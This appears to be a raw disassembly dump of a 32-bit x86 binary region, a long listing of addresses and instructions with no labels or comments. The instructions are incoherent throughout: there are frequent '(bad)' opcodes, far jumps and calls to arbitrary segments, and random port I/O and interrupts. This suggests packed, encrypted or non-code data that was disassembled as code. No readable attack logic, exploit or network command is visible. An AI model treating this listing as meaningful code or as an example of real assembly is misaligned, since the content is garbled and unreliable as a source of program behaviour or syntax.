  405b52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b53:	and    edi,DWORD PTR ds:0xc51b3d6b
  405b59:	repnz cmp al,0x36
  405b5c:	jge    0x405ae0
  405b5e:	jmp    0xa5a9:0x755e244e
  405b65:	lods   eax,DWORD PTR ds:[esi]
  405b66:	mov    bl,0xe7
  405b68:	int    0xea
  405b6a:	push   cs
  405b6b:	out    0xc2,al
  405b6d:	jmp    0xf2bab2cd
  405b72:	and    dh,BYTE PTR [eax+0x2b0ef554]
  405b78:	out    dx,eax
  405b79:	push   ebp
  405b7a:	test   al,0x2f
  405b7c:	cmp    BYTE PTR [ebx+0x5c],ch
  405b7f:	stos   BYTE PTR es:[edi],al
  405b80:	ret    
  405b81:	lahf   
  405b82:	dec    ebp
  405b83:	dec    edx
  405b84:	ss pop es
  405b86:	cmc    
  405b87:	pop    esp
  405b88:	aas    
  405b89:	jl     0x405bdc
  405b8b:	retf   0xc8df
  405b8e:	ret    
  405b8f:	jmp    0xa952:0x152637c0
  405b96:	ins    DWORD PTR es:[edi],dx
  405b97:	mov    cl,0x51
  405b99:	sti    
  405b9a:	retf   0xbb14
  405b9d:	or     eax,0x7d39f079
  405ba2:	or     eax,0x278537ad
  405ba7:	mov    cl,BYTE PTR [ebx]
  405ba9:	mov    es,WORD PTR [ecx-0x133e4ae8]
  405baf:	imul   edx,DWORD PTR [ecx+0x2a],0x5ce9566f
  405bb6:	ret    0xd0c0
  405bb9:	add    edi,0xba867844
  405bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bc0:	jae    0x405bb8
  405bc2:	adc    eax,0x32fa1f9b
  405bc7:	popf   
  405bc8:	or     al,0xf6
  405bca:	out    dx,eax
  405bcb:	or     eax,0xa53bbacd
  405bd0:	gs lock aad 0x2
  405bd4:	mov    ecx,0xdd646372
  405bd9:	(bad)  
  405bda:	dec    esp
  405bdb:	ins    DWORD PTR es:[edi],dx
  405bdc:	push   edi
  405bdd:	je     0x405ba8
  405bdf:	loop   0x405c19
  405be1:	mov    ah,0x27
  405be3:	cmp    edx,ebx
  405be5:	jmp    0xd33da0df
  405bea:	push   ebp
  405beb:	call   0xf71c:0xed4e8add
  405bf2:	add    dl,dh
  405bf4:	add    edi,eax
  405bf6:	inc    ebx
  405bf7:	xor    ch,BYTE PTR [eax-0x63]
  405bfa:	cmp    BYTE PTR [ecx+0x22],bl
  405bfd:	scas   al,BYTE PTR es:[edi]
  405bfe:	cmp    eax,0x8afc8ccb
  405c03:	iret   
  405c04:	push   edx
  405c05:	test   al,0x54
  405c07:	pushf  
  405c08:	js     0x405c5c
  405c0a:	add    dl,bh
  405c0c:	push   edx
  405c0d:	cmp    eax,0x406512e
  405c12:	jnp    0x405bc6
  405c14:	or     DWORD PTR [ebx],0x12
  405c17:	xlat   BYTE PTR ds:[ebx]
  405c18:	retf   
  405c19:	imul   edx,DWORD PTR [ebp+0x51],0xcfe3ac8a
  405c20:	(bad)  
  405c21:	loopne 0x405c3f
  405c23:	cmp    bl,BYTE PTR [esi+ecx*4+0x846a9a5]
  405c2a:	mov    ecx,0x85b1c38
  405c2f:	mov    edi,0x1052eaa4
  405c34:	mov    edx,0x1c253bdf
  405c39:	out    dx,eax
  405c3a:	imul   esp,DWORD PTR [ebx-0x3a54649a],0x29
  405c41:	mov    edx,0x8ab57ade
  405c46:	or     edi,DWORD PTR [ebp+0x108b5ba7]
  405c4c:	daa    
  405c4d:	mov    cl,0x5d
  405c4f:	xor    eax,0x521561fc
  405c54:	inc    ebx
  405c55:	iret   
  405c56:	mov    ss,eax
  405c58:	shr    DWORD PTR [ebx+0x3e],1
  405c5b:	inc    edx
  405c5c:	outs   dx,BYTE PTR ds:[esi]
  405c5d:	stos   DWORD PTR es:[edi],eax
  405c5e:	in     al,dx
  405c5f:	dec    ebp
  405c60:	(bad)  
  405c61:	(bad)  
  405c62:	push   ecx
  405c63:	in     eax,0x7e
  405c65:	mov    WORD PTR [ebx-0x29373bc4],fs
  405c6b:	xchg   edi,eax
  405c6c:	mov    ds:0xf86ba038,al
  405c71:	cdq    
  405c72:	ficom  WORD PTR [edx-0x5b7f659e]
  405c78:	pop    ecx
  405c79:	dec    ebp
  405c7a:	fwait
  405c7b:	cwde   
  405c7c:	inc    esi
  405c7d:	mov    bl,0x97
  405c7f:	loop   0x405cac
  405c81:	test   ebp,0xecd5636e
  405c87:	inc    ecx
  405c88:	or     eax,0x72a19c38
  405c8d:	push   0xc104ab97
  405c92:	ds push ecx
  405c94:	mov    esp,0x8ee08d96
  405c99:	shld   edi,edx,0x38
  405c9d:	clc    
  405c9e:	pop    eax
  405c9f:	inc    edi
  405ca0:	mov    ah,0x42
  405ca2:	jecxz  0x405cd8
  405ca4:	mov    esi,0x9b2ab60c
  405ca9:	xor    BYTE PTR [edi+eax*4],dl
  405cac:	xchg   esi,eax
  405cad:	into   
  405cae:	iret   
  405caf:	mov    dl,0xf1
  405cb1:	ds fdivr st,st(0)
  405cb4:	pop    edi
  405cb5:	clc    
  405cb6:	or     DWORD PTR [eax-0x2adb8a14],esp
  405cbc:	stos   DWORD PTR es:[edi],eax
  405cbd:	lods   al,BYTE PTR ds:[esi]
  405cbe:	mov    ds:0xa54384d7,al
  405cc3:	sti    
  405cc4:	adc    DWORD PTR [eax+0x767c2755],eax
  405cca:	ds push esi
  405ccc:	jle    0x405d10
  405cce:	xor    DWORD PTR cs:[edx],edx
  405cd1:	ins    BYTE PTR es:[edi],dx
  405cd2:	(bad)  
  405cd3:	sahf   
  405cd4:	call   0x709f:0x6a44e743
  405cdb:	dec    ebp
  405cdc:	js     0x405d31
  405cde:	or     BYTE PTR [esi-0x5cbfef76],ch
  405ce4:	cmp    eax,0x356f3221
  405ce9:	je     0x405d10
  405ceb:	xchg   edx,eax
  405cec:	mov    esi,0x526fe500
  405cf1:	call   0xf12f:0x1bbcfd24
  405cf8:	sub    BYTE PTR ds:0x6fb24852,ah
  405cfe:	cmc    
  405cff:	aad    0x9
  405d01:	sub    ebp,ebx
  405d03:	jge    0x405ccd
  405d05:	mov    ah,0xee
  405d07:	ins    DWORD PTR es:[edi],dx
  405d08:	les    ebp,FWORD PTR [ebp+0x4c]
  405d0b:	sub    BYTE PTR [ebx-0x7c935da3],cl
  405d11:	push   ecx
  405d12:	pop    ecx
  405d13:	dec    edx
  405d14:	retf   0x974f
  405d17:	adc    BYTE PTR [esi-0x292b6b76],bh
  405d1d:	sub    BYTE PTR [ebx-0x7a],0xf9
  405d21:	xchg   esi,eax
  405d22:	sti    
  405d23:	cmp    ebx,DWORD PTR [esi+0x49]
  405d26:	cli    
  405d27:	lea    edi,[ebp+0x62]
  405d2a:	js     0x405d34
  405d2c:	aad    0x3
  405d2e:	ret    
  405d2f:	push   ebp
  405d30:	inc    esi
  405d31:	xlat   BYTE PTR ds:[ebx]
  405d32:	cld    
  405d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d34:	add    ebp,DWORD PTR [eax]
  405d36:	loopne 0x405d9f
  405d38:	cli    
  405d39:	pop    esp
  405d3a:	dec    esi
  405d3b:	inc    esp
  405d3c:	int    0xde
  405d3e:	mov    edi,0x3b95c340
  405d43:	xor    BYTE PTR [esi],cl
  405d45:	mov    ah,0x94
  405d47:	cdq    
  405d48:	cs sar eax,cl
  405d4b:	mov    eax,ds:0xef14b1e9
  405d50:	inc    eax
  405d51:	sub    eax,DWORD PTR [esi]
  405d53:	bound  esi,QWORD PTR [ebp+0x6d]
  405d56:	cli    
  405d57:	stos   DWORD PTR es:[edi],eax
  405d58:	cld    
  405d59:	repnz shl BYTE PTR [esi-0x1f5e7b54],1
  405d60:	jo     0x405dc1
  405d62:	push   ss
  405d63:	(bad)  
  405d64:	push   edx
  405d65:	cmc    
  405d66:	pop    esi
  405d67:	inc    eax
  405d68:	lods   eax,DWORD PTR ds:[esi]
  405d69:	pushf  
  405d6a:	mov    eax,eax
  405d6c:	scas   al,BYTE PTR es:[edi]
  405d6d:	stc    
  405d6e:	jmp    0x3ca009c4
  405d73:	or     al,0x43
  405d75:	jne    0x405d76
  405d77:	jmp    0xee6c:0x966d6777
  405d7e:	icebp  
  405d7f:	mov    edi,0xbda6a840
  405d84:	and    al,0x1d
  405d86:	push   ecx
  405d87:	(bad)  
  405d88:	or     BYTE PTR [ecx+ebx*8],al
  405d8b:	cmp    BYTE PTR [eax],0xf0
  405d8e:	in     eax,dx
  405d8f:	test   al,0x97
  405d91:	das    
  405d92:	imul   ebx,DWORD PTR [esi+0x2f],0x3f82d60d
  405d99:	pop    edx
  405d9a:	rcl    DWORD PTR [ebp+0xf377364],cl
  405da0:	dec    esi
  405da1:	fwait
  405da2:	sub    BYTE PTR [esi],dl
  405da4:	mov    esp,esp
  405da6:	jnp    0x405da7
  405da8:	rcl    BYTE PTR [edi-0x5add3ee3],1
  405dae:	popf   
  405daf:	js     0x405ddf
  405db1:	cwde   
  405db2:	je     0x405d7c
  405db4:	cmp    al,0x80
  405db6:	adc    DWORD PTR [ebp-0x23],eax
  405db9:	adc    eax,0xc7aa4856
  405dbe:	in     al,0xbd
  405dc0:	inc    esi
  405dc1:	add    si,WORD PTR [edx]
  405dc4:	ins    DWORD PTR es:[edi],dx
  405dc5:	mov    ebp,DWORD PTR [ebp+esi*2-0x42]
  405dc9:	je     0x405df9
  405dcb:	sub    esi,DWORD PTR [edx]
  405dcd:	iret   
  405dce:	dec    edx
  405dcf:	push   edx
  405dd0:	int3   
  405dd1:	jmp    0xe860d3
  405dd6:	xchg   BYTE PTR [ebx+0x16],cl
  405dd9:	das    
  405dda:	out    dx,eax
  405ddb:	enter  0x4582,0xd3
  405ddf:	inc    ecx
  405de0:	cdq    
  405de1:	adc    dh,BYTE PTR [edi+ebx*1+0x8647b55]
  405de8:	test   DWORD PTR [edi],esi
  405dea:	int3   
  405deb:	sahf   
  405dec:	xchg   edi,eax
  405ded:	and    ch,BYTE PTR [edx]
  405def:	inc    esi
  405df0:	xor    DWORD PTR [ebp-0x476ae157],ebp
  405df6:	shl    edi,1
  405df8:	retf   0x9207
  405dfb:	pop    esp
  405dfc:	ja     0x405e71
  405dfe:	stos   DWORD PTR es:[edi],eax
  405dff:	scas   al,BYTE PTR es:[edi]
  405e00:	add    eax,0x7873146d
  405e05:	mov    esi,esi
  405e07:	mov    al,0xdc
  405e09:	mov    al,0x30
  405e0b:	(bad)  
  405e0c:	(bad)  
  405e0d:	mov    ebx,0x2477d143
  405e12:	pop    ecx
  405e13:	fsub   DWORD PTR [edi+ebp*2+0x5c221f73]
  405e1a:	push   es
  405e1b:	inc    edx
  405e1c:	das    
  405e1d:	sbb    al,dh
  405e1f:	les    esp,FWORD PTR [edi+ebx*8]
  405e22:	loop   0x405dac
  405e24:	push   ds
  405e25:	scas   al,BYTE PTR es:[edi]
  405e26:	mov    eax,ds:0x15d85977
  405e2b:	aas    
  405e2c:	mov    ds:0x79af249e,al
  405e31:	sbb    al,0xd6
  405e33:	and    bh,BYTE PTR ds:[ebp+0x56]
  405e37:	mov    BYTE PTR [edi-0x396f6e79],al
  405e3d:	and    al,0xc2
  405e3f:	inc    edx
  405e40:	add    eax,0x7402172
  405e45:	and    ebx,DWORD PTR [eax+0x36]
  405e48:	test   DWORD PTR [esi-0x1b],esi
  405e4b:	sub    BYTE PTR [edi+0x17e93e28],dl
  405e51:	cdq    
  405e52:	inc    edi
  405e53:	das    
  405e54:	ins    DWORD PTR es:[edi],dx
  405e55:	(bad)  
  405e57:	jle    0x405ece
  405e59:	popa   
  405e5a:	aam    0x1d
  405e5c:	call   0xadac:0x7b1f0f6a
  405e63:	mov    esi,0x4b22d22f
  405e68:	adc    dh,BYTE PTR [esi+0xb9ef99e]
  405e6e:	dec    ebx
  405e6f:	repz mov esp,0x4c1d52f8
  405e75:	cwde   
  405e76:	xchg   edx,eax
  405e77:	pop    ss
  405e78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e79:	imul   edx,DWORD PTR [eax-0x2c],0xe5fb2240
  405e80:	rcl    ch,0xc4
  405e83:	add    cl,dh
  405e85:	ret    
  405e86:	mov    esi,0x463769c6
  405e8b:	pop    esi
  405e8c:	pushf  
  405e8d:	js     0x405ea6
  405e8f:	mov    al,0x56
  405e91:	mov    ds:0xbf36974c,al
  405e96:	mov    bh,cl
  405e98:	xor    DWORD PTR [edi+0x76],esp
  405e9b:	jmp    0x1fbe:0x4c76d592
  405ea2:	sbb    BYTE PTR [edx],bh
  405ea4:	enter  0x3975,0xf4
  405ea8:	call   FWORD PTR [ebp-0x31]
  405eab:	aas    
  405eac:	loopne 0x405f09
  405eae:	ss enter 0xbf98,0x4d
  405eb3:	lods   al,BYTE PTR ds:[esi]
  405eb4:	cmc    
  405eb5:	ss loope 0x405e57
  405eb8:	test   bh,dh
  405eba:	xchg   edx,eax
  405ebb:	jne    0x405f35
  405ebd:	cs lahf 
  405ebf:	pusha  
  405ec0:	enter  0x279e,0x3c
  405ec4:	leave  
  405ec5:	gs xor eax,0xa898d0ea
  405ecb:	fwait
  405ecc:	je     0x405eaf
  405ece:	pushf  
  405ecf:	adc    eax,0xeb006a6
  405ed4:	or     ebp,DWORD PTR [eax-0x2ff095ca]
  405eda:	and    DWORD PTR [eax],edi
  405edc:	mov    bh,0xfd
  405ede:	fnstenv [ecx+eax*1]
  405ee1:	xchg   DWORD PTR [ebp+0x6b],esp
  405ee4:	popf   
  405ee5:	call   ebx
  405ee7:	add    BYTE PTR [ebp-0x48],al
  405eea:	inc    eax
  405eeb:	xor    al,0x88
  405eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eee:	mov    ah,0xb6
  405ef0:	dec    ebx
  405ef1:	imul   esp,DWORD PTR [esi-0x7],0xef549583
  405ef8:	cli    
  405ef9:	enter  0x761b,0x6
  405efd:	mov    ebx,0x1a75e573
  405f02:	mov    eax,ds:0xc32d8c3f
  405f07:	fbstp  TBYTE PTR [edi+0x4cf3886]
  405f0d:	pop    edi
  405f0e:	mov    eax,0x96fc95d5
  405f13:	loope  0x405ed1
  405f15:	imul   edi,DWORD PTR [esi],0x4b2befb6
  405f1b:	inc    ebx
  405f1c:	hlt    
  405f1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f1e:	int    0x4c
  405f20:	(bad)  
  405f22:	adc    BYTE PTR [edi],al
  405f24:	clc    
  405f25:	(bad)  
  405f26:	push   ebp
  405f27:	adc    dl,BYTE PTR [edi+0x22]
  405f2a:	test   eax,0x9057c22d
  405f2f:	lods   al,BYTE PTR ds:[esi]
  405f30:	add    al,0x97
  405f32:	(bad)  
  405f33:	std    
  405f34:	adc    ah,BYTE PTR [eax]
  405f36:	xor    al,BYTE PTR [edi-0xd]
  405f39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f3a:	call   0xca2c5bd6
  405f3f:	xchg   edx,esi
  405f41:	bound  edx,QWORD PTR [ebx]
  405f43:	shl    DWORD PTR ss:[edi],1
  405f46:	sti    
  405f47:	cdq    
  405f48:	mov    BYTE PTR [ebp-0x52],ch
  405f4b:	dec    edx
  405f4c:	or     eax,0xdf875687
  405f51:	sbb    eax,0x5a6ed2dd
  405f56:	sbb    al,0xd1
  405f58:	ins    BYTE PTR es:[edi],dx
  405f59:	repnz (bad) 
  405f5b:	into   
  405f5c:	push   cs
  405f5d:	adc    eax,DWORD PTR [ecx]
  405f5f:	(bad)  
  405f60:	xchg   edx,eax
  405f61:	loope  0x405f97
  405f63:	cmp    eax,0x30e00ea7
  405f68:	clc    
  405f69:	rcr    BYTE PTR [ebx-0xb561f60],cl
  405f6f:	popa   
  405f70:	test   eax,0x503941f0
  405f75:	mov    ax,0x5c40
  405f79:	fisub  WORD PTR [ecx+0x67]
  405f7c:	es enter 0x8f02,0xf6
  405f81:	or     eax,0x7c32bcd8
  405f86:	push   cs
  405f87:	add    eax,0x7652a36
  405f8c:	ds pop eax
  405f8e:	mov    bh,0x82
  405f90:	or     al,0x2e
  405f92:	sbb    esi,edi
  405f94:	push   ebp
  405f95:	and    eax,0xe23edaf9
  405f9a:	mov    BYTE PTR [ebp-0x59f0bfed],dh
  405fa0:	test   BYTE PTR [esi-0x80],0x66
  405fa4:	sti    
  405fa5:	push   edi
  405fa6:	mov    edx,0xbcb4de0e
  405fab:	mov    al,0xe1
  405fad:	inc    ebp
  405fae:	adc    edi,esp
  405fb0:	pop    edi
  405fb1:	jmp    0x405f43
  405fb3:	jno    0x405f48
  405fb5:	call   0x4a14933d
  405fba:	push   ds
  405fbb:	adc    BYTE PTR [eax+0x14a7ab48],bl
  405fc1:	mov    ds:0x970a763f,eax
  405fc6:	xchg   ecx,eax
  405fc7:	xor    DWORD PTR [eax],ebx
  405fc9:	jg     0x405f8b
  405fcb:	in     al,0xcb
  405fcd:	addr16 push edx
  405fcf:	adc    DWORD PTR [ebx+edi*4+0x6e],ebx
  405fd3:	out    0x4b,eax
  405fd5:	cmp    BYTE PTR [esp+ebx*8+0x10],cl
  405fd9:	addr16 test eax,0x12e00007
  405fdf:	adc    ebp,DWORD PTR [edx+0xe1b5d2d]
  405fe5:	(bad)  
  405fe6:	div    edx
  405fe8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fe9:	mov    ?,WORD PTR [edx+0x26bb52e4]
  405fef:	push   esp
  405ff0:	push   ebx
  405ff1:	loop   0x405fca
  405ff3:	das    
  405ff4:	jnp    0x406049
  405ff6:	jecxz  0x405fcc
  405ff8:	mov    DWORD PTR [ebx-0x49],edx
  405ffb:	out    dx,al
  405ffc:	inc    ebp
  405ffd:	mov    ds:0x42ff7a3e,al
  406002:	pop    edx
  406003:	inc    ecx
  406004:	sub    al,0x13
  406006:	push   ds
  406007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406008:	pushf  
  406009:	push   ecx
  40600a:	cmp    DWORD PTR [esi+0x7ceca5df],edx
  406010:	mov    ch,ah
  406012:	das    
  406013:	and    cl,al
  406015:	lock iret 
  406017:	in     al,dx
  406018:	add    eax,0x4cd58607
  40601d:	ret    0xf21b
  406020:	call   0xaf1d:0x9a011279
  406027:	dec    ebx
  406028:	loopne 0x406026
  40602a:	mov    esp,0xac6f6d55
  40602f:	and    al,0xe4
  406031:	int3   
  406032:	mov    cl,0x40
  406034:	add    al,0x98
  406036:	dec    esi
  406037:	lds    edx,FWORD PTR [esi-0x35b34a0e]
  40603d:	dec    ebp
  40603e:	pop    es
  40603f:	and    BYTE PTR es:[ebx-0x2fbb0a7b],bh
  406046:	adc    eax,0xf8b7be0d
  40604b:	nop    DWORD PTR [edx-0x5a]
  40604f:	mov    edi,0xa80de6bc
  406054:	out    0x5c,eax
  406056:	dec    edi
  406057:	shr    DWORD PTR [ecx+0x2a],cl
  40605a:	ret    
  40605b:	test   BYTE PTR [edx],0x16
  40605e:	inc    esi
  40605f:	push   edi
  406060:	dec    esi
  406061:	loopne 0x406063
  406063:	jmp    0xfc6e6a38
  406068:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406069:	add    BYTE PTR [edi+0x2c9dde2b],bh
  40606f:	adc    ebp,DWORD PTR [eax+0x22a4babf]
  406075:	cmp    ebp,eax
  406077:	popa   
  406078:	sahf   
  406079:	push   cs
  40607a:	xchg   BYTE PTR [edx+0x63ef2a9a],bh
  406080:	sub    dh,BYTE PTR [esi]
  406082:	sti    
  406083:	cli    
  406084:	mov    bl,0x12
  406086:	das    
  406087:	call   0xe623aad0
  40608c:	cwde   
  40608d:	addr16 addr16 cmp ah,ch
  406091:	pop    ebx
  406092:	je     0x406022
  406094:	mov    al,0x14
  406096:	cld    
  406097:	arpl   WORD PTR [esi-0x45],bx
  40609a:	sti    
  40609b:	or     ecx,DWORD PTR [eax]
  40609d:	fldenv [ecx+0x7b]
  4060a0:	loope  0x4060ad
  4060a2:	adc    esi,edi
  4060a4:	dec    edx
  4060a5:	push   ds
  4060a6:	push   ecx
  4060a7:	rcl    DWORD PTR [edx-0x12],cl
  4060aa:	pop    ss
  4060ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060ac:	jnp    0x406073
  4060ae:	sub    ebp,DWORD PTR [ecx+ebx*8+0x2ff7b2c]
  4060b5:	push   ecx
  4060b6:	xor    dl,0xa9
  4060b9:	js     0x4060e7
  4060bb:	or     eax,0xefda22c7
  4060c0:	mov    ebp,0x5bd4ea11
  4060c5:	push   esp
  4060c6:	sbb    ecx,esp
  4060c8:	jg     0x4060c6
  4060ca:	sti    
  4060cb:	adc    dh,ch
  4060cd:	xor    ebx,DWORD PTR [eax]
  4060cf:	jns    0x406097
  4060d1:	jecxz  0x406066
  4060d3:	push   ecx
  4060d4:	bnd jns 0x40605a
  4060d7:	push   es
  4060d8:	iret   
  4060d9:	enter  0xf91,0x8f
  4060dd:	mov    DWORD PTR [eax+0xd],esi
  4060e0:	aam    0x55
  4060e2:	push   ss
  4060e3:	fisubr WORD PTR [eax]
  4060e5:	mov    ecx,0x2843cc2d
  4060ea:	pop    edi
  4060eb:	jne    0x4060a9
  4060ed:	and    cl,bl
  4060ef:	mov    eax,0x72aec40e
  4060f4:	jg     0x406150
  4060f6:	inc    ebp
  4060f7:	mov    ah,0xda
  4060f9:	jmp    0x354c:0x16c345cf
  406100:	xchg   edx,eax
  406101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406102:	fwait
  406103:	loop   0x406136
  406105:	sub    DWORD PTR [edx],edi
  406107:	inc    edx
  406108:	xchg   edx,eax
  406109:	xchg   edx,eax
  40610a:	push   ebp
  40610b:	xor    ebx,DWORD PTR [eax-0x56]
  40610e:	fldcw  WORD PTR [edi+0x38e60c64]
  406114:	retf   0xc95f
  406117:	push   ss
  406118:	retf   0x1782
  40611b:	xchg   ebp,eax
  40611c:	push   ecx
  40611d:	leave  
  40611e:	or     DWORD PTR [edx+0x5a03b1f],0xffffffab
  406125:	or     DWORD PTR [esi+eiz*4],edi
  406128:	outs   dx,DWORD PTR ds:[esi]
  406129:	ss daa 
  40612b:	imul   esp,DWORD PTR [ebx-0x63],0xffffffb2
  40612f:	pop    edx
  406130:	pop    ds
  406131:	inc    esp
  406133:	add    BYTE PTR ds:0x92a3f06e,dl
  406139:	imul   esp,DWORD PTR [edx-0x7e],0xaa140e42
  406140:	adc    DWORD PTR [ebx+0x7d21c942],esp
  406146:	inc    ecx
  406147:	out    dx,al
  406148:	das    
  406149:	jmp    0x4060e9
  40614b:	xlat   BYTE PTR ds:[ebx]
  40614c:	xor    esp,DWORD PTR [ecx+0x477751a1]
  406152:	mov    eax,DWORD PTR [edi-0x451d46ec]
  406158:	mov    edx,0x16a35584
  40615d:	je     0x4060e9
  40615f:	mov    bh,0x59
  406161:	sub    DWORD PTR [esi],eax
  406163:	outs   dx,BYTE PTR ds:[esi]
  406164:	loopne 0x406155
  406166:	hlt    
  406167:	adc    eax,0x1f085682
  40616c:	in     al,0x63
  40616e:	bound  edx,QWORD PTR [esi]
  406170:	mov    ch,0x4b
  406172:	popf   
  406173:	adc    cl,dh
  406175:	pop    edi
  406176:	push   eax
  406177:	loopne 0x4061f4
  406179:	imul   eax,DWORD PTR [edi-0x79bf4164],0x3c
  406180:	sub    al,0xd8
  406182:	mov    dl,0x78
  406184:	daa    
  406185:	jl     0x4061c9
  406187:	or     al,0x27
  406189:	test   DWORD PTR [ebp+0x4bc1e324],edi
  40618f:	lods   eax,DWORD PTR ds:[esi]
  406190:	shr    BYTE PTR [ebx-0x4f348e26],cl
  406196:	imul   edx,DWORD PTR [edx+esi*1-0x18ad3bd2],0xf91dd776
  4061a1:	popa   
  4061a2:	sub    eax,0x4bf6c57f
  4061a7:	push   ebp
  4061a8:	aas    
  4061a9:	push   edx
  4061aa:	mov    edi,0xaaf6c117
  4061af:	fnsave [esi-0x635c53c2]
  4061b5:	cmc    
  4061b6:	bound  edx,QWORD PTR [edx]
  4061b8:	aaa    
  4061b9:	or     DWORD PTR [ecx],esi
  4061bb:	ret    
  4061bc:	aas    
  4061bd:	int    0x23
  4061bf:	repz fcom DWORD PTR [ecx+eax*1+0x73]
  4061c4:	mov    cl,0xeb
  4061c6:	bound  edx,QWORD PTR [eax-0x123c829a]
  4061cc:	lds    edx,FWORD PTR [ebp-0x69627011]
  4061d2:	cdq    
  4061d3:	ds mov cl,0x20
  4061d6:	adc    eax,0xb8316aff
  4061db:	and    edi,DWORD PTR [ebx]
  4061dd:	inc    eax
  4061de:	scas   eax,DWORD PTR es:[edi]
  4061df:	pop    ecx
  4061e0:	jne    0x406177
  4061e2:	adc    BYTE PTR [ebx+0x4a3ec18e],al
  4061e8:	push   cs
  4061e9:	adc    eax,0xea61b8ea
  4061ee:	stc    
  4061ef:	sbb    BYTE PTR [edi-0x6fac5f7c],0xcf
  4061f6:	fwait
  4061f7:	jnp    0x406271
  4061f9:	mov    ds:0x45b6836c,ax
  4061ff:	retf   
  406200:	pop    ecx
  406201:	add    BYTE PTR [edi+0x4c],dl
  406204:	and    DWORD PTR [ebx],ebx
  406206:	in     eax,dx
  406207:	jae    0x406192
  406209:	xchg   esi,eax
  40620a:	out    0x9a,al
  40620c:	out    dx,eax
  40620d:	sbb    al,0x77
  40620f:	inc    edi
  406210:	mov    bh,0x36
  406212:	fwait
  406213:	pop    ebx
  406214:	es dec ebx
  406216:	(bad)
  406219:	cmp    DWORD PTR [edi-0x5c3673e7],0xffffff8f
  406220:	or     esi,eax
  406222:	push   esp
  406223:	loopne 0x4061fa
  406225:	lahf   
  406226:	aas    
  406227:	xor    DWORD PTR [ebx+0xf],esp
  40622a:	mov    edi,0x5701ba70
  40622f:	sar    DWORD PTR [esi],1
  406231:	push   esi
  406232:	dec    edx
  406233:	mov    edx,0xacc4e0c2
  406238:	scas   al,BYTE PTR es:[edi]
  406239:	dec    edx
  40623a:	or     bh,BYTE PTR [ebx+0x4bc2196b]
  406240:	(bad)  
  406241:	mov    al,0xa4
  406243:	push   0xffffffca
  406245:	jo     0x4062ab
  406247:	addr16 cdq 
  406249:	xchg   edx,eax
  40624a:	pop    eax
  40624b:	inc    edx
  40624c:	sbb    ch,bl
  40624e:	jmp    0x406247
  406250:	es dec ebx
  406252:	ins    DWORD PTR es:[edi],dx
  406253:	ja     0x406249
  406255:	loope  0x4061d8
  406257:	pop    ecx
  406258:	push   ds
  406259:	loop   0x406233
  40625b:	jmp    0x4658:0x36e098ab
  406262:	gs mov cl,0xe5
  406265:	inc    edi
  406266:	int    0xf8
  406268:	push   ds
  406269:	retf   0xb4c0
  40626c:	femms  
  40626e:	xchg   ebp,eax
  40626f:	loope  0x4062cf
  406271:	je     0x4061f6
  406273:	sbb    esi,DWORD PTR [ebx]
  406275:	mov    al,0x9a
  406277:	fadd   QWORD PTR [ebx+0x57]
  40627a:	push   0x16bb989
  40627f:	jns    0x4062f5
  406281:	jle    0x40621e
  406283:	iret   
  406284:	sbb    eax,0x897644b1
  406289:	inc    esp
  40628a:	add    al,BYTE PTR [edi]
  40628c:	add    eax,esp
  40628e:	cmp    edx,ebx
  406290:	add    eax,0x40d07d49
  406295:	and    al,bl
  406297:	sahf   
  406298:	cmp    DWORD PTR [esi-0x7c],eax
  40629b:	(bad)  
  40629c:	pop    ds
  40629d:	xor    edi,ebp
  40629f:	cmp    cl,BYTE PTR [edx-0x7fd0b7d]
  4062a5:	mov    edx,0x56204322
  4062aa:	mov    edx,0xa4299163
  4062af:	and    DWORD PTR [edi-0x72],0xffffffd8
  4062b3:	iret   
  4062b4:	addr16 in eax,dx
  4062b6:	mov    edx,0x4ca0551d
  4062bb:	sub    al,0x11
  4062bd:	mov    esp,0xca5927be
  4062c2:	pushf  
  4062c3:	scas   al,BYTE PTR es:[edi]
  4062c4:	jnp    0x406311
  4062c6:	xchg   BYTE PTR [eax],dl
  4062c8:	sti    
  4062c9:	pop    esi
  4062ca:	dec    ebp
  4062cb:	in     al,dx
  4062cc:	or     esp,edi
  4062ce:	adc    ah,BYTE PTR ds:0x5477971e
  4062d4:	jbe    0x40628e
  4062d6:	data16 jle 0x40631f
  4062d9:	push   esp
  4062da:	cli    
  4062db:	fucomp st(2)
  4062dd:	inc    edx
  4062de:	addr16 add eax,0x4d5fa2cf
  4062e4:	in     eax,dx
  4062e5:	mov    eax,esi
  4062e7:	dec    edi
  4062e8:	inc    edi
  4062e9:	fnstsw WORD PTR [ebx+ecx*1-0x28]
  4062ed:	je     0x406317
  4062ef:	cli    
  4062f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062f1:	push   ds
  4062f2:	sar    BYTE PTR [esi-0x35033b15],0xe6
  4062f9:	aad    0xc1
  4062fb:	out    dx,al
  4062fc:	jp     0x4062a1
  4062fe:	sub    dh,BYTE PTR [ebp+0x42]
  406301:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406302:	push   0x996d2ca8
  406307:	fcomp  DWORD PTR [esi+0x72a5a2b2]
  40630d:	mov    ds,WORD PTR [eax+edx*2+0x2b11063]
  406314:	cmp    DWORD PTR gs:[ecx+0x79],esi
  406318:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406319:	ins    BYTE PTR es:[edi],dx
  40631a:	sub    BYTE PTR [ecx],0xd5
  40631d:	in     al,dx
  40631e:	jne    0x406357
  406320:	idiv   eax
  406322:	mov    bh,0x52
  406324:	push   esp
  406325:	mov    bl,0x10
  406327:	mov    ch,BYTE PTR [edi]
  406329:	cdq    
  40632a:	out    dx,al
  40632b:	or     esp,ebp
  40632d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40632e:	pop    es
  40632f:	sub    DWORD PTR [edx-0x69],esi
  406332:	es jb  0x406319
  406335:	in     al,dx
